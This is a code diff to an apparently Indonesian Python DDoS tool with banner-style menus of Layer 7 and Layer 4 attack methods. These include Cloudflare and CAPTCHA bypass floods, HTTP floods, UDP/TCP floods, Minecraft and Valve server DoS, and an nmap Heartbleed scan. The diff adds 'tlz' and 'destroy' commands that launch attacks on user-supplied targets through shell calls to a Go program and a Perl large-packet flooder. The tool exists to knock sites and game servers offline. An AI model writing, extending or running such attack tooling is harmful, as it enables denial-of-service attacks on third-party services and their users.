@@ -1113,7 +1113,7 @@ def Launchtlz(url, th, t):
 def Attacktlz(url, until_datetime):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            os.system(f'cd godzilla && go run TLZ.go -url {url} GET')
+            os.system(f'go run TLZ.go -url {url} GET')
         except IndexError:
             #pass
             print('coba cek lagi')
@@ -1146,8 +1146,7 @@ def help():
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"         ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝        \n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"        ══╦═══════════════════════╦══\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"╔═════════╩═══════════════════════╩═════════╗\n")
-    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l7a   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer7 Methods (page 1) "+Fore.LIGHTGREEN_EX+"   ║\n")
-    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l7b   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer7 Methods (page 2) "+Fore.LIGHTGREEN_EX+"   ║\n")
+    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l7    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer7 Methods "+Fore.LIGHTGREEN_EX+"            ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l4    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer4 Methods "+Fore.LIGHTGREEN_EX+"            ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show tools          "+Fore.LIGHTGREEN_EX+"            ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"credit"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show credit         "+Fore.LIGHTGREEN_EX+"            ║\n")
@@ -1184,7 +1183,7 @@ def credit():
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
-def layer7_a():
+def layer7():
     clear()
     stdout.write(" "+Fore.LIGHTGREEN_EX  +   " PAGE 1                                          \n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"  █████╗  █████╗ ██╗    ██████╗ ██████╗  ██████╗ ███████╗ \n")
@@ -1202,10 +1201,10 @@ def layer7_a():
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝   \n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"        ════╦════════════════════════════════════╦══\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"╔═══════════╩════════════════════════════════════╩═════════╗\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"COMMAND"+Fore.LIGHTGREEN_EX+"    "+Fore.LIGHTWHITE_EX+"                     LIST                 "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"                     COMMAND"+Fore.LIGHTGREEN_EX+"    "+Fore.LIGHTWHITE_EX+"LIST                 "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║══════════════════════════════════════════════════════════║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                         "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy              "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" tlz                                      "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" ovh-beam                                 "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfpro  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfsoc  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"bypass "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,   "+Fore.LIGHTGREEN_EX+"║\n")
@@ -1227,49 +1226,6 @@ def layer7_a():
     stdout.write("\n")
 ##############################################################################################
 
-def layer7_b():
-    clear()
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +   " PAGE 2                                          \n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"  █████╗  █████╗ ██╗    ██████╗ ██████╗  ██████╗ ███████╗ \n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +" ██╔══██╗██╔══██╗██║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ \n")
-    stdout.write(" "+Fore.LIGHTWHITE_EX  +" ███████║███████║██║    ██║  ██║██║  ██║██║   ██║███████╗ \n")
-    stdout.write(" "+Fore.LIGHTWHITE_EX  +" ██╔══██║██╔══██║██║    ██║  ██║██║  ██║██║   ██║╚════██║ \n")
-    stdout.write(" "+Fore.LIGHTWHITE_EX  +" ██║  ██║██║  ██║██║    ██████╔╝██████╔╝╚██████╔╝███████║ \n")
-    stdout.write(" "+Fore.LIGHTWHITE_EX  +" ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ \n")
-    stdout.write("                                                                                  \n")
-    stdout.write(" "+Fore.LIGHTWHITE_EX  +"    ██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗ \n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"    ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║ \n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"    ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝ \n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"    ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝  \n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"    ███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║   \n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝   \n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"        ════╦════════════════════════════════════╦══\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"╔═══════════╩════════════════════════════════════╩═════════╗\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"       COMMAND"+Fore.LIGHTGREEN_EX+""+Fore.LIGHTWHITE_EX+"LIST                                   "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║══════════════════════════════════════════════════════════║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"tlz        "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"https2     "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"hulk2      "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http-flood "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http-rand  "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"rapid      "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"ovh-beam   "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"╚══════════════════════════════════════════════════════════╝\n")
-    stdout.write("\n")
-##############################################################################################
 
 def layer4():
     clear()
@@ -1289,11 +1245,12 @@ def layer4():
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"   ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═╝ \n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"        ══╦══════════════════════════════╦══\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"╔═════════╩══════════════════════════════╩═════════╗\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                             "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                             "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"mine  "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Minecraft Dos attack                   "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"samp  "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" tekan ctrl+c untuk stop attack          "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"vse   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Send Valve Source Engine Protocol      "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" destroy                               "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                            "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"mine   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Minecraft Dos attack                  "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"samp   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" tekan ctrl+c untuk stop attack        "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"vse    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Send Valve Source Engine Protocol     "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"destroy"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Random attack large packet            "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"╚══════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 
@@ -1354,14 +1311,14 @@ def command():
         help()
     elif command == "credit":
         credit()
-    elif command == "layer7a" or command == "LAYER7A" or command == "l7a" or command == "L7A" or command == "Layer7A":
-        layer7_a()
-    elif command == "layer7b" or command == "LAYER7B" or command == "l7b" or command == "L7B" or command == "Layer7B":
-        layer7_b()
+    elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
+        layer7()
     elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
         layer4()
     elif command == "tools" or command == "tool":
         tools()
+    elif command == "func" or command == "fungsi":
+        func()
     elif command == "exit":
         exit()
     elif command == "test":
@@ -1512,6 +1469,13 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
+    elif command == "tlz":
+        target, thread, t = get_info_l7()
+        picture()
+        threading.Thread(target=Launchtlz, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
 
     elif command == "udp" or command == "UDP":
         target, port, thread, t = get_info_l4()
@@ -1541,6 +1505,15 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
+    elif command == "destroy":
+        target, port, thread, t = get_info_l4()
+        try:
+            os.system(f'perl destroy.pl {target} {port} 65500 {t}')
+        except IndexError:
+            print('Usage: destroy <ip> <port> <time>')
+            print('Example: destroy 1.1.1.1 80 60')
+
+
         
     elif command == "ovh-beam":
         target, port, methode, t = get_info_l7c()
@@ -1585,14 +1558,8 @@ def command():
             os.system (f" nmap -d --script=ssl-heartbleed --script-args=vulns.showall -sV {target} ")
         except :
             print (" ada yang error cuy ... ")
-            
-            
-            
-            
-            
-            
-            
-            
+
+
     else:
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")  
 
@@ -1625,13 +1592,15 @@ def func():
     stdout.write(Fore.RED+"  \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
-    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"mine        "+Fore.RED+": "+Fore.WHITE+"minecraft disconnect login DOS (not supported)\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"mine       "+Fore.RED+": "+Fore.WHITE+"minecraft disconnect login DOS (not supported)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"vse        "+Fore.RED+": "+Fore.WHITE+"Send Valve Source Engine Protocol\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"destroy    "+Fore.RED+": "+Fore.WHITE+"Random attack large packet\n")
 
     stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"scan-ip    "+Fore.RED+": "+Fore.WHITE+"Vulnerability scanning tool\n")
 
     stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
